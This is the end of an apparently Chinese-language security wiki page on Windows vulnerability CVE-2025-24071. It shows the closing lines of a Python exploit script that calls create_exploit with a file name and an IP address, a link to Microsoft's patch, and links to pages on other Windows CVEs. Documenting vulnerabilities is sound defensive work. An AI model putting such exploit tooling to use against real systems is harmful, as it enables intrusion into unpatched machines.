        <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">file_name</span> <span class="ow">and</span> <span class="n">args</span><span class="o">.</span><span class="n">ip_address</span><span class="p">:</span>
            <span class="n">create_exploit</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">file_name</span><span class="p">,</span> <span class="n">args</span><span class="o">.</span><span class="n">ip_address</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">Fore</span><span class="o">.</span><span class="n">RED</span><span class="si">}</span><span class="s2">✗ Error: Both --file-name and --ip-address are required</span><span class="si">{</span><span class="n">Style</span><span class="o">.</span><span class="n">RESET_ALL</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
            <span class="n">parser</span><span class="o">.</span><span class="n">print_help</span><span class="p">()</span>
</code></pre></div>
<h2 id="_5">漏洞修复<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h2>
<ul>
<li>微软已发布安全补丁，链接： <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-24071">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-24071</a></li>
</ul>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../Windows%20%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%20CVE-2019-0708/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../Windows%20%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%20CVE-2019-0708/" class="btn btn-xs btn-link">
        Windows 远程桌面服务漏洞 CVE-2019-0708
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../Windows%20Win32k%20%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%20CVE-2021-1732/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../Windows%20Win32k%20%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%20CVE-2021-1732/" class="btn btn-xs btn-link">
        Windows Win32k 本地提权漏洞 CVE-2021-1732
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>